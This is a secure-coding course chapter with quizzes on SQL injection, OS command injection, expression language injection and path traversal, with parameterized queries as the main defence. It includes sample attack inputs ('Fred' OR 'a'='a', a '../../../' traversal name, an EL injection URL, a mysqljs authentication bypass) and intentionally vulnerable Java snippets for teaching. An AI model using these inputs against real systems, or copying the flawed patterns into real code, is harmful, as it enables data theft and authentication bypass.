First, the obvious: if a program is known to be insecure, and security matters, then don’t use it! But usually, you are not using a known-insecure program, so let’s move beyond that.

If there is a relatively easy way to limit privileges of the routine you are calling, do so. If you can *limit* the privileges given, then, if an attacker breaks through, the damage is more limited and it may make it harder for the attacker to cause more damage. This is another example of the security principle of least privilege. For example, if you are calling a database, try to limit database privileges of the program making the request. If you are using SQL, consider using the **GRANT** command so the requesting program has fewer privileges.

A useful principle is to only call a routine with valid values. If a routine requires that a number be 0 through 9, then it should not be possible for an attacker to cause 50 to be sent. This is easier in theory than in practice, especially since those limits are not always well-documented. But where you know of a limitation, consider doing some checks to make sure they are honored, or write your program so that the limitations are necessarily honored.

A very important principle is that if a routine is hard to use securely, and there is another way to do the task that is easier to do securely, *use the routine that is easier to use securely*. Here are some warning signs that you are using a routine that is hard to use securely:

*   It executes whatever program is sent to it, and some data you send might come from an attacker. Any routine with a name like **eval()**, **exec()**, **execute()**, or **system()** has a high chance of being in this category. For example, don’t use **eval()** in JavaScript to process JSON data (in general!); use something safer like JavaScript’s function **JSON.parse()**.

*   It requires you to concatenate constant strings with data that might come from an attacker. Generally, that other data from an attack has to be escaped, and it is easy to make a mistake when escaping data.

*   Its input format is described using a language specification (such as Backus-Naur Form).

*   It was intended for direct human interaction, not for a program to invoke it.

You *can* use such routines securely, and sometimes you need to. But if you can avoid it, your program will probably be more secure - and it will probably be easier to maintain, too. If you cannot avoid them, you may want to wrap their use in special wrappers to make them easier to use safely.

Why are certain kinds of routines hard to use securely? One common problem is that many routines accept languages with *metacharacters* - that is, characters that change how other characters are interpreted instead of being data themselves. For example, the double quote character (**“**) is often a metacharacter (including in SQL and shell). If there is a language specification, that almost certainly means there are metacharacters. Supporting metacharacters is very flexible, and if all of the input is trusted, it is not a problem. But when parts of the data might be from an attacker, you need to be very careful and take extra precautions. If an attacker can insert metacharacters into the input, and they are not escaped exactly correctly, then dangerous and easily-exploited vulnerabilities often follow if they are read by some kind of interpreter. These kinds of attacks are sometimes called injection attacks.

🔔 Vulnerabilities to injection attacks are such common mistakes in web applications that “Injection” is 2017 OWASP Top 10 #1 and 2021 OWASP Top 10 #3. 2021 CWE Top 25 #28 and 2019 CWE Top 25 #18 are identified [CWE-94](https://cwe.mitre.org/data/definitions/94.html), *Improper Control of Generation of Code (‘Code Injection’)*. 2021 CWE Top 10 #25 is [CWE-77](https://cwe.mitre.org/data/definitions/77.html), *Improper Neutralization of Special Elements used in a Command ('Command Injection')*. Both CWE-94 and CWE-77 are special cases of [CWE-74](https://cwe.mitre.org/data/definitions/74.html). *Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')*. The general category CWE-74 has other common special cases such as SQL injection vulnerabilities ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) and operating system command injection ([CWE-78](https://cwe.mitre.org/data/definitions/78.html)) that we will soon discuss.

So you need to ensure that when you send data to some program (or output), you send it in a secure way. That may involve:

*   **Sanitizing**<br>Removing any illegal or potentially-malicious character (usually metacharacters) from the data.

*   **Escaping**<br>Modifying characters (some metacharacters) so that they are not interpreted incorrectly.

*   **Normalizing**<br>Changing the form of data to be a common form (and, as a side-effect, preventing it from causing a security problem).

Where possible, use libraries and APIs that do this for you; they are easier to use securely.

Let’s now examine some common injection attack cases and how to handle them securely. Again, an injection vulnerability is when a program accepts data from an attacker and improperly hands that data to some command interpreter. Some of the most common problems occur when that data is sent to a database system (SQL injection attacks) or an operating system command interpreter (OS command injection attacks), so we will focus on those. Once you understand how to deal with these two common cases, it will be much clearer how to properly handle other interpreters we will not cover here (e.g., the Lightweight Directory Access Protocol (LDAP)). We will begin by discussing sending data to database systems, which are often vulnerable to SQL injection attacks.

#### Quiz 3.1: Introduction to Securely Calling Programs - The Basics

\>>Just pick secure software to reuse, and your application will be secure. True or False?<<

( ) True

(x) False

\[Explanation]

This is false. Clearly, if you pick known *insecure* software, you will have a problem. In addition, you should prefer software that’s easier to use securely. But in general, you need to *use* reused software in a secure way - not just pick secure components.

\[Explanation]

## Calling Other Programs: Injection and Filenames

### SQL Injection

#### SQL Injection Vulnerability

![image alt text](exploits_of_a_mom.png)

**Exploits of a Mom**, retrieved from [xkcd.com](https://xkcd.com/327/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

Most database systems include a language that can let you create arbitrary queries, and typically many other functions too (e.g., creating and modifying things). The SQL language is especially common, and while some database systems use other languages, those other languages often have similarities with SQL. Such languages, including SQL, include metacharacters. When attackers can insert metacharacters into a SQL command to cause a security problem, the attack is called an *SQL injection attack*, and the vulnerability is called an *SQL injection vulnerability*. SQL injection is sometimes abbreviated as SQLi.

Even if the database language is not SQL, if it is an attack on a language for a database system it is often called an SQL injection attack (even though this is technically not accurate). We will focus on SQL, because SQL is very common and once you understand how to counter SQL injection attacks, it is easy to generalize this to any database language.

Here is a trivial example; here is a snippet of Java that tries to do an SQL query, but does it insecurely:

```java
    String QueryString = "select * from authors where lastname = ' " + search_lastname + " '; "; // VULNERABLE CODE
    rs = statement.executeQuery(QueryString); // VULNERABLE CODE
```

The intent is clear; if **search_lastname** has the value **Fred**, then the database will receive the query “**select \* from authors where lastname='Fred';**” - a reasonable SQL query. But remember our warning signs - this code concatenates strings, some of that data is probably provided by an attacker, and we’re doing something called “execute”.  The warning signs are right. Imagine that the attacker provides the input “**Fred' OR 'a'='a**”. This will produce the query “**select \* from authors where lastname='Fred' OR 'a'='a';**” and now the attacker can retrieve the entire database. The attacker could even modify or delete data this way, depending on various factors. This is a simple example of an SQL injection attack; an attacker can insert some characters and inject new or modified commands.

There are many ways to trigger SQL injection attacks; attackers can insert single quotes (used to surround constant character data), semicolons (which act as command separators), “**--**” which is a comment token, and so on. This is not a complete list; different database systems interpret different characters differently. For example, double quotes are often metacharacters, but with different meanings. Even different versions of the *same* database system, or different configurations, can cause changes to how the characters are interpreted. We already know we should not create a list of “bad” characters, because that is a denylist. We could create an allowlist of characters we know are not metacharacters and then escape the rest, but this process is hard to do correctly for SQL.

Don't concatenate strings to create a DBMS query, because that is insecure by default. That includes using format strings, string interpolations, string templates, and all other mechanisms that simply concatenate text. For example, the same vulnerabilities happen if you use Python formatted string literals (f-strings such as <tt>f'{year}-{month}'</tt>), Python's `.format` method, JavaScript's template strings (<tt>`${year}-${month}`</tt>), PHP's string interpolations (<tt>"${year}-${month}"</tt>), Ruby string interpolation (<tt>"#{year}-#{month}"</tt>), Go (string) templates, or any other string-based template or formatting language. Remember, we want to try to use a routine that is easy to use securely, and all of these are dangerous by default when used to create commands like SQL commands.

Many developers try to fix this in an unwise way by calling an escape routine on every value, e.g., like this:

```java
    String QueryString = "select * from authors where lastname = ' " +
                         sql_escape(search_lastname) + " '; "; // BAD IDEA
```

This approach (calling an escape routine every time you use untrusted input)
has a fundamental flaw: the *default* is insecure.
If an escape routine must be called every time untrusted data is used,
and there are many uses of untrusted data,
eventually someone will forget to call the escape function.
Many programs create many queries, so there are many opportunities to
forget to do it.
The mistake can happen at the beginning, or later when the code is modified,
but experience shows that the mistake *will* happen.

> 😱 STORY TIME: Heartland Payment Systems / SQL Injection

> In late 2007 attackers used a SQL injection attack to compromise the database of Heartland Payment Systems (aka "Heartland"). At the time Heartland processed 100 millino payment card transactions per month for 175,000 merchants. The attackers used the SQL injection to insert code into Web scripts used by the Web login page. The attackers eventually used this accept to install a spyware program called a 'sniffer' that captured the card data as payments were processed for several months in 2008. As a result, Heartland temporarily lost its compliance with the Payment Card Industry Data Security Standard (PCI DSS), which was required to implement their core business of processing card payments. Heartland reportedly had to pay $145 million in compensation for fraudulent payments (["Data Breach Directions: What to Do After an Attack" by Diane Ritchey](https://www.securitymagazine.com/articles/86071-data-breach-directions-what-to-do-after-an-attack)). They have since taken many steps to make their systems stronger and more robust to try to prevent a recurrence.

🔔 SQL injection is a special case of injection attacks, and we have already noted that injection attacks are so common and dangerous that they are 2017 OWASP Top 10 #1. SQL injection specifically is such a common cause of security vulnerabilities that just SQL injection is 2021 CWE Top 25 #6 and 2019 CWE Top 25 #6. SQL injection is also identified as [CWE-89](https://cwe.mitre.org/data/definitions/89.html), *Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)*.

Again, we want to try to use an approach that is easy to use correctly - it needs to be secure by default.

For databases, there are well-known solutions that are far easier to use securely.

#### SQL Injection Solutions

SQL injection vulnerabilities are one of the most common and devastating vulnerabilities, especially in web applications. They are also easy to counter, once you know how to do it.

*Parameterized statements*, aka *parameterized queries*, are perhaps the best way to counter SQL injection attacks if you are directly creating SQL commands that need to be secure. Parameterized statements are statements that let you identify placeholders (often a “**?**”) for data that needs to be escaped. A pre-existing library that you call then takes those parameters and in effect escapes the data properly for that specific implementation. The exact syntax for placeholders depends on the library and/or database you're using.

For our purposes, a *prepared statement* compiles the statement with the database system ahead-of-time so that a later request with specific data can be executed more efficiently. Preparing a statement with a database ahead-of-time can improve performance if the statement will be executed multiple times. Prepared statement APIs generally include support for parameterized statements, and many people (and APIs) use the terms "prepared statement" and "parameterized statement" as synonyms.

For security, the key is to use an API with parameterized statements (including a prepared statement API) and ensure that every untrusted input is sent as a separate parameter. Make sure that you do *not* normally include untrusted input by concatenating untrusted data as a string (including a formatted string) into a request.

##### Advantages of parameterized/prepared statements

Most programming languages have at least one library that implements parameterized statements and/or prepared statements. Using parameterized statements, including by using prepared statements, has many advantages:

1.  Since the library does the escaping for you, it is simpler to use and more likely to be right.

2.  It tends to produce easier-to-maintain code, since the code tends to be easier to read.

3.  Many can handle variation in different SQL engines (which is important because different systems often have different syntax rules).

##### Example: Prepared statements in Java

Here is an example of using prepared statements in Java
using its JDBC interface:

```java
    String QueryString = "select * from authors where lastname = ?";
    PreparedStatement pstmt = connection.prepareStatement(QueryString);
    pstmt.setString(1, search_lastname);
    ResultSet results = pstmt.execute( );
```

There are more statements than our earlier example, but the statements are simpler. In particular, the complicated concatenation is now a simple string constant. We still call something called “**execute**” - but remember, avoiding methods named “execute” is just a rule of thumb to help us detect potential problems.

Note: Some parameterized statement and/or prepared statement
libraries are not thread-safe. In other words,
some libraries assume that at any given time only a single thread can
access an instance.
This is true for the Java prepared statement API used here;
this Java API is not thread-safe. So when using this Java interface,
only define `PreparedStatement` objects as method-level variables
(instead of class-level variables) to reduce the risk of thread safety
problems, as suggested by
[*Bobby Tables* (Java)](https://bobby-tables.com/java).

Of course, like any technique, if you use it wrongly then it won’t be secure. Here is an example of how to use prepared statements in Java to produce a probably-insecure program:

```java
    String QueryString = "select * from authors where lastname = '" + search_lastname + "';";
    PreparedStatement pstmt = connection.prepareStatement(QueryString);
    ResultSet results = pstmt.execute( ); // Probably insecure, don’t do this!
```

This insecure program uses a prepared statement, but instead of correctly using “**?**” as a value placeholder (which will then be properly escaped), this code directly concatenates data into the query. Unless the data is properly escaped (and it almost certainly is not), this code can quickly lead to a serious vulnerability if this data can be controlled by an attacker.

##### Examples: Parameterized and Prepared Statements in some Other Languages

Parameterized and prepared statements are widely available, though the
APIs and placeholder syntax vary by programming language, library, and database.
Here we'll see some examples.

In Python there are several libraries that interface to databases.
Many of them implement the Python Database API Specification v2.0
([PEP 249](https://peps.python.org/pep-0249/)),
whose `execute` and `executemany` methods implement parameterized statements.
The library's placeholder syntax is reported by its `paramstyle` attribute.
Here's a simple Python example from the
Python sqlite3 library documentation
[Python (sqlite3)](https://docs.python.org/3/library/sqlite3.html):

```python
    con = sqlite3.connect(...)
    cur = con.cursor()
    cur.execute("insert into test(d, ts) values (?, ?)", (today, now))
```

Here's an example of a query in go from the [go.dev documentation on querying](https://go.dev/doc/database/querying):

```go
    rows, err := db.Query("SELECT * FROM album WHERE artist = ?", artist)
```

When using Node and JavaScript there are many ways to use
parameterized and prepared statements.
Here's an example using the node-postgres callback interface,
as described in the
[node-postgres documentation](https://node-postgres.com/features/queries):

```javascript
    const text = 'INSERT INTO users(name, email) VALUES($1, $2) RETURNING *'
    const values = ['brianc', 'brian.m.carlson@gmail.com']
    client.query(text, values, (err, res) => { ....  })
```

The PostgreSQL `libpq` C interface provides several functions, as
explained in the [PostgreSQL (Command Execution Functions) documentation](https://www.postgresql.org/docs/current/libpq-exec.html):

*   `PQexec` directly runs a single string command and returns a result.
*   `PQexecParams` implements a parameterized statement.
    Placeholders are represented in the command as `$1`, `$2`, etc.,
    and the parameter values are supplied as separate parameters in the same call.
*   `PQprepare` implements a prepared statement.
    It takes a statement with placeholders and
    submits it to the database to be prepared.
    Users can later use the separate `PQexecPrepared` call
    to provide the placeholder parameter values and execute the resulting
    command.

The [OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) and [Bobby Tables website](https://bobby-tables.com/) provide examples for a variety of ecosystems.

##### Subtle issues: DBMS (Server) side vs. Application (client) side

An important security issue is *where* the
parameters of a parameterized statement are processed.
There are two options, DBMS-side and application-side, and
DBMS-side is better from a security point of view.

From a security point-of-view it's best if the parameters of
parameterized statements are processed directly
within the database management system (DBMS),
aka "DBMS-side" parameter processing.
This approach is often called "server-side" since many DBMSs use a
client/server architecture where the client connects over a network
to a server-side DBMS.
There are many advantages to DBMS-side parameter processing.
The DBMS has the current information on escaping rules
(and can often use more efficient mechanisms than adding escape characters),
and it also has other information such the relevant character encodings
and expected data types.
Perhaps most importantly, the DBMS developers will typically have
security experts review this part of the DBMS system.
However, DBMS-side parameter processing can require more effort to
implement, so some libraries use
"application-side" parameter processing instead.

"Application-side" parameter processing occurs when the parameter escaping
occurs within a library *not* in the DBMS, but instead in the application's
processing space.
This is also called "client-side" parameter processing.
Application-side parameter processing systems generally are implemented
by directly inserting escape characters where they are needed.
Application-side parameter processing is often easier to implement, so
several DBMS libraries use this approach.
Application-side libraries are better than directly calling an escape
mechanism "by hand" on every use since the escapes are automatically added.

Unfortunately, application-side parameter processing has a weakness:
the application side may interpret information differently than the DBMS.
This weakness can lead to vulnerabilities. For example:

1.  The application-side library may be intended for a different
    version of the DBMS. The DBMS may have a different list of characters
    or situations that need to be escaped.
2.  The application-side library may interpret multi-byte characters
    differently or not escape multi-byte characters correctly for the
    circumstance that actually exists on the DBMS side. (See
    [Multibyte character exploits PHP/MySQL](https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql).)
3.  If the application-side library implements parameterization of
    data types more complex than numbers and strings (such as arrays,
    objects, associative arrays, and/or dictionaries), then there
    is a significant risk of a vulnerability.
    The fundamental problem is that the application-side library isn't
    parsing the query language the same way that the DBMS would -
    it is doing simple text substitutions. So if the library implements this
    functionality, it must typically make *guesses* of what types are expected.
    For example, it may guess that associative arrays are only sent
    to the library when that is sensible in the parameterized SQL query.
    That guess, sadly, may be exploitable.
    This is especially a risk in languages that don't require static types
    (compile-time knowledge of types), as it's much easier to get unexpected
    complex types into a library that cannot always handle them securely.
    For example, the widely-used Node.js MySQL library
    [mysqljs/mysql](https://github.com/mysqljs/mysql)
    as of early 2022 is often exploitable through its parameterized library
    *if* a JavaScript object can be sent as a parameter to it
    (see
    [Finding an Authorization Bypass on my Own Website](https://maxwelldulin.com/BlogPost?post=9185867776) by Maxwell Dulin (ꓘ)).

That last issue for application-side processing
(that complex data types may not always be escaped properly)
can be confusing, so an example may help.
In the Node.js mysqljs/mysql library,
imagine that an attacker manages to provide
the JavaScript *object* `{password = 1}` as the password parameter
(this is not just a string, but an actual JavaScript object).
Now imagine that this object is used in the SQL query <tt>SELECT \* FROM accounts WHERE username = ? AND password = ?</tt>
(note that this is parameterized).
The library will internally expand the expression after `AND`
into <tt>password = \`password\` = 1</tt> because the library does simple
text replacement of the second `?`, without noticing that a JavaScript object
doesn't make sense in the context of this query (a string or number would
be expected here).
The MYSQL DBMS will interpret <tt>password = \`password\`</tt>
as 1 (true), and then determine that `1 = 1` is true.
The result: this expression will *always* be true.
This incorrect escaping of a complex data type
is enough to completely bypass authentication in some situations.

Unfortunately, this last issue can be a challenge to solve:

1.  The safe solution is to make sure that complex data types
    (types other than numbers and strings) are not expanded by
    application-side libraries
    unless the developer specifically marks them as allowed.
    This may be impractical if the application already depends on this,
    and the library might not provide a way to fully disable the functionality.
    For example, mysqljs/mysql allows setting `stringifyObjects` to true
    when calling `mysql.createConnection`, but while this can help,
    this only disables escaping generic Objects - it does not
    disable other complex data types such as arrays.
2.  The general solution is to verify every type before calling the library.
    For example, require that all data expected to be strings must be strings.
    This is typically easy to do in a statically typed language
    if the language enforces the types - just declare the required type.
    This can take a lot of time to implement in languages that don't
    enforce static types, and there is also the
    risk of missing a check when creating or modifying the code.
    However, this approach is more flexible.
    (See ["Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql"](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) by Flatt Security Inc., 2022-02-21.)

It's often hard to determine if a library uses DBMS-side or
application-side parameterization, and in some circumstances
only an application-side approach is available.
In some cases requesting a prepared statement forces the library to
use DBMS-side processing, but don't assume it - check the documentation.
If you have a practical choice, prefer a DBMS-side implementation.

##### Stored Procedures

Many database systems support "stored procedures", that is,
procedures embedded in the database itself.
If you use stored procedures, and commands (such as queries)
are dynamically constructed in them, then you can again have
SQL injection vulnerabilities.

Again, the best solution is usually to use a parameterized query mechanism
when creating the dynamic command (e.g., the SQL) inside the
stored procedure. Be careful; in some systems using them correctly
can be a little tricky.

For more information on using parameterized queries
in stored procedures, see your library's documentation, the
[OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html#stored-procedure-examples), and the
[OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

##### When Parameterized Statements Won't Work

In some situations parameterized statements (including
prepared statements) will *not* work.
Many parameterized statement APIs only allow replacing SQL values, so
they do not allow varying information such as the names of tables, the names
of columns, or the sort order direction.

In those cases you may need to create a query by concatenating data.
In those cases, make *sure* you carefully validate the data (using an allowlist)
so only specific and safe values are allowed.
Often the allowlist is a short list of permitted values, or at most
a simple expression that only allows ASCII letters and digits.
A risk with this approach is that if the validation
is ever skipped (e.g., after some code change),
the system may become extremely vulnerable.

The [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
has a nice suggestion: if you *must* do this concatenation,
make the user input *different* from what you will actually use, and
in the program map the user input to the values you will use.
If user input doesn't have a valid mapping, reject the input.
This increases the probability that a change to the program
will not result in unvalidated input being concatenated into a query,
or that the problem will be detected before shipping.
For example, in Python, if you need to write to a user-provided table name, you can do the following:

```python
    table_name_untrusted = request.get("table_name")  # This is untrusted, don't put this directly in the query!
    table_name_map = {"table1": "db.table1", "table2": "db.table2"}
    table_name = table_name_map[table_name_untrusted]
    con = sqlite3.connect(...)
    cur = con.cursor()
    cur.execute(f"insert into {table_name}(d, ts) values (?, ?)", (today, now)) # This is safe because we know that table_name can only take trusted values from table_name_map
```

##### Other Approaches for Countering SQL Injection

Many programs use object-relational mapping (ORM). This is just a technique to automatically convert data in a relational database into an object in an object-oriented programming language and back; lots of libraries and frameworks will do this for you. This is fine, as long as the ORM is implemented using parameterized statements or something equivalent to them. In practice, any good ORM implementation will do so. So if you are using a respected ORM, you are already doing this. That said, it is common in systems that use ORMs to occasionally need to use SQL queries directly… and when you do, use parameterized statements or prepared statements.

Some applications use a "query builder" library to build commands (queries) programmatically through a sequence of calls instead of embedding a command string. Some ORMs include a query builder system. Again, a well-implemented query builder will use parameterized statements or similar internally. So if you use a query builder, use one that is implemented using parameterized statements, and provide untrusted data as separate parameters so the query builder can use the parameterized statements correctly.

There are other approaches, of course. You can write your own escape code, but this is difficult to get correct, and typically a waste of time since there are usually existing libraries to do the job.

In summary, properly using parameterized statement libraries makes it much easier to write secure code. In addition, they typically make code easier to read, automatically handle the variations between how databases escape things, and sometimes they are faster than doing metacharacter escapes yourself.

#### Quiz 3.2: SQL Injection

\>>Parameterized statements (including prepared statements) are a valuable countermeasure against SQL injection, but you have to use placeholders for every data value that might possibly be controllable by an attacker. True or False?<<

(x) True

( ) False

### OS Command (Shell) injection

Another kind of injection attack is the operating system (OS) injection attack, also known as a shell injection attack. This is similar to an SQL injection attack; the problem is that information (usually text), some of it trusted and some from an attacker, is sent to an interpreter that executes what it is sent. The difference is that instead of being sent to a database, this mixture is sent to the OS command interpreter, aka the command shell.

Most systems have at least one command shell. Even small embedded systems, like televisions and routers, often have a command shell inside. Shells are useful for many things, including quickly combining programs, doing some queries, debugging, and so on. Many Unix-like systems, including typical Linux distributions, have multiple shells available including bash, dash, ksh, zsh, and csh; at least one of those is installed as **/bin/sh** or **/usr/bin/sh**. MacOS similarly comes with a shell and others can be easily installed. Windows systems typically use different shells with very different syntax (**cmd.exe**, **command.exe**, or PowerShell), but they have shells too.

A shell is a program that directly takes commands and runs programs as commanded. Since this is useful, many programming languages make it easy to call out to a shell. In particular, many languages have a way to dynamically construct a call to a shell and then execute it. However, it is easy to make mistakes when combining attacker data into a command to be run by a shell. In particular, try to avoid dynamically creating a mixture of commands and attacker-provided data to then be executed by the shell. Instead, try to find an alternative that is easier to use securely.

If all you want to do is call another program and pass it some parameters, try to do that without dynamically creating and then interpreting a shell command at all! Instead, try to call the program directly. This is more efficient anyway, and this is far easier (and more likely) to be secure if any of those parameters might include data from an attacker. For example:

*   In C, prefer **execve(3)** (it does not use the shell) instead of using **system(3)** (which does use the shell).

*   In Python, prefer using **shell=False** (the default) with **subprocess.run()** or  **subprocess.call()**, instead of using **shell=True** or **os.system()**

*   In JavaScript Node.js, prefer using **shell=False** (the default) with **child_process.spawn()** or **child_process.execFile()** instead of using **shell=True** or **child_process.exec()**

In short: if you see code that concatenates strings (including formatted strings) for execution by a shell, and that concatenation includes untrusted input, be extremely concerned. While it is possible to do this securely, it is better avoided when you reasonably can.

If you must call a program through a shell, and also include some data that might be provided by an attacker, you need to use it securely. That is actually rather tricky. As always, *do not use a denylist*. There are many “lists of shell metacharacters” that are wrong because they miss some. So if you are sending data through a shell, you need to escape every character except for ones on an allowlist (characters you know are *not* metacharacters). Generally, A-Z, a-z, and 0-9 are not metacharacters, and after that, check very carefully. Make sure you quote everything as needed.

Of course, if you are calling a program with any data that might be from an attacker, you need to make sure that the data will not be misinterpreted. For example, make sure your command-line options will be correctly interpreted; if an attacker can cause the initial character to be “**-**” or “**/**” in a parameter, then they might be misinterpreted as an option or root directory. Anything passed in (e.g., by parameter or anything else) must be carefully escaped to prevent attack. This brings us to the topic of filenames, which we will cover next.

🔔 OS command injection is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #11 and 2021 CWE Top 25 #5. It is [CWE-78](https://cwe.mitre.org/data/definitions/78.html), *Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)*.

#### Quiz 3.3: OS Command (Shell) injection

\>>Avoid unnecessarily calling an operating system shell when you simply want to run another program. True or False?<<

(x) True

( ) False

\[Explanation]

This is true. Not only is it more efficient, but the operating system shell usually responds to a large number of special characters that you would need to deal with to use it securely. If you don’t need its additional functions, there is no point in calling through it. Of course, there may be cases where its additional capabilities are valuable to you; in those cases, you will need to be very careful and escape metacharacters to ensure that data is not misinterpreted.

\[Explanation]

### Other Injection Attacks

There are many other kinds of injection attacks beyond SQL injection and operating system command injection. There may be a risk of an injection attack any time you are sending data partly controlled by an untrusted user in a format that has metacharacters, is defined as a language, and/or is processed by an interpreter.

Examples where there may be a risk of an injection vulnerability include generating and sending JSON, yaml, XML, Lightweight Directory Access Protocol (LDAP) commands, and many other formats to libraries, frameworks, and other components that you depend on, as well as outputting them to eventual users. In all cases, one solution is to use an API that automatically escapes the text as necessary, just like using parameterized statements when generating SQL.

One interesting variation of an injection attack occurs when some expression is unintentionally executed twice. This can occur, for example, in some uses of the expression language in the widely-used Spring Java framework, where the attack is called expression language injection. This vulnerability is remarkably common, so we’ll explain it further here.

An “Expression Language” (EL) was developed as part of the Java Server Pages Standard Tag Library (JSTL) to make it easy to get data from the underlying object model. For example, this:

> `<c:out value="person.address.street"/>`

Is a convenient shorthand for:

> `<%=HTMLEncoder.encode(((Person)person).getAddress().getStreet())%>`

The problem is that in some cases it’s possible to have the EL interpreted twice when using Spring given certain versions and configurations. For example, the tags `<spring:message>` and `<spring:theme>` may interpret twice the following attributes: `arguments`, `code`, `text`, `var`, `scope`, and `message`. For another example, `<spring:bind>` and `<spring:nestedpath>` may interpret twice the attribute `path`. When this is happening, as noted in “[Remote Code with Expression Language Injection](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)” by Amodio (2012), is that a request of the form:

> `http://vulnerable.com/foo?message=${applicationScope}`

to a page that contains:

> `<spring:message text="" code="${param['message']}"></spring:message>`

can result in output that contains internal server information including the classpath and local working directories.

Whether or not the problem happens depends on the version of Spring, its Java Server Pages /Servlet container (if present), and some configuration options. For more information, see "[Expression Language Injection](https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf)" by Di Paola and Dabirsiaghi (2011) and “\[[Remote Code with Expression Language Injection](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)” by Amodio (2012).

Obviously it’s important to ensure that expressions are only evaluated as many times as expected (typically once). It’s wise to make sure the configuration does this, if there is a possible alternative. If there are any concerns, include tests in your automated test suite to verify that expressions are only being evaluated once in safe contexts, so that any future mistake will be immediately detected before being used in production. In the case of Spring, a test could supply data like `${99999+1}` in a risky construct and then ensure that the response text was the expected one (and not `100000`).

🔔 2021 CWE Top 25 #30 is [CWE-917](https://cwe.mitre.org/data/definitions/917.html), *Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')*.

### Filenames (Including Path Traversal and Link Following)

Technically, a “**pathname**” is a sequence of bytes that describes how to find a filesystem object. On Unix-like systems, including Linux, Android, MacOS, and iOS, a pathname is a sequence of one or more filenames separated by one or more “**/**”. On Windows systems, a pathname is more complicated but the idea is the same. In practice, many people use the term “filename” to refer to pathnames.

Pathnames are often at least partly controlled by an untrusted user. For example, it is often useful to use filenames as a key to identify relevant data, but this can lead to untrusted users controlling filenames. Another example is when monitoring or managing shared systems (e.g., virtual machines or containerized filesystems); in this case, an untrusted monitoree controls filenames. Even when an attacker should not be able to gain this kind of control, it is often important to counter this kind of problem as a defense-in-depth measure, to counter attackers who gain a small amount of control.

#### Path Traversal

An obvious case is that systems are often not supposed to allow access outside of some directory (e.g., a “document root” of a web server). For example, if a program tries to access a path that is a concatenation of “**trusted_root_path**” and “**username**”, the attacker might be able to create a username “.**./../../mysecrets**” and foil the limitations. This vulnerability, where an attacker can create filenames that traverse outside where it is supposed to, is so common that it has a name: *directory traversal vulnerabilities*. As always, use a very limited allowlist for information that will be used to create filenames. If your web application’s allowlist does not include “**.**”, “**/**”, “**~**”, and “**\\**”, on most systems it is significantly harder to traverse outside the intended directory root. Another common solution is to convert a relative path into a normalized absolute path in a way that eliminates all “**..**” uses and then ensure that the resulting path is still in the correct region of the filesystem.

> 😱 STORY TIME: SaltStack

> An example of a directory traversal vulnerability is [CVE-2020-11652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11652), a vulnerability in the SaltStack. SaltStack is a configuration management and orchestration tool for managing multi-computer infrastructure. In this vulnerability, a method failed to properly sanitize an input parameter, allowing “**..**” elements that were used to create a filename. The result was that attackers could cause entire sets of machines to execute commands of their choosing.

🔔 Path traversal is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #8 and 2019 CWE Top 25 #10. It is also identified as [CWE-22](https://cwe.mitre.org/data/definitions/22.html), *Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)*.

#### Windows Pathnames

Microsoft Windows pathnames can be extremely difficult to deal with securely. Windows pathname interpretations vary depending on the version of Windows and the API used (many calls use **CreateFile** which supports the pathname prefix “**\\.\\**” - and these interpret pathnames differently than the other calls that do not). Perhaps most obviously, “**letter:**” and “**\server\share...**” have a special meaning in Windows. A nastier issue is that there are reserved filenames, whose form depends on the API used and the local configuration. The built-in reserved device names are as follows: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9. Even worse, drivers can create more reserved names - so you actually cannot know ahead-of-time what names are reserved. You should avoid creating filenames with reserved names, both with and without an extension; if an attacker can trick the program into reading/writing the name (e.g., **com1.txt**), it may (depending on API) cause read or write to a device instead of a file. In this case, even simple alphanumerics can cause disaster and be interpreted as metacharacters - this is rare, since usually alphanumerics are safe. Windows supports “**/**” as a directory separator, but it conventionally uses “**\\**” as the directory separator (which is annoying because **\\** is widely used as an escape character). In Windows, don’t end a file or directory name with a space or period; the underlying filesystem may support it, but the Windows shell and user interface generally do not. For more details, check the Microsoft Windows documentation on [*Naming Files, Paths, and Namespaces*](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN).

#### Unix/Linux Pathnames

Filenames and pathnames on Unix-like systems are not always easy to deal with either. On most Unix-like systems, a filename can be any sequence of bytes that does not include **\0** (the terminator) or slash. One common misconception is that Unix filenames are a string of characters. Unix filenames are not a string of one or more characters; they are merely a sequence of bytes, so a filename does not need to be a legal sequence of characters. For example, while it is a common convention to interpret filenames as a UTF-8 encoding of characters, most systems do not actually enforce this. Indeed, they tend to enforce nothing, so many problematic filenames can be created, including filenames with spaces (or only spaces), control characters (including newline, tab, escape, etc.), bytes that are not legal UTF-8, or

including a leading “**-**” (the marker for command options). These problematic filenames can cause trouble later.

Some potential problems with filenames are specific to the shell, but filename problems are not limited to the shell. A common problem is that “**-**” is the option flag for many commands, but it is a legal beginning of a filename.

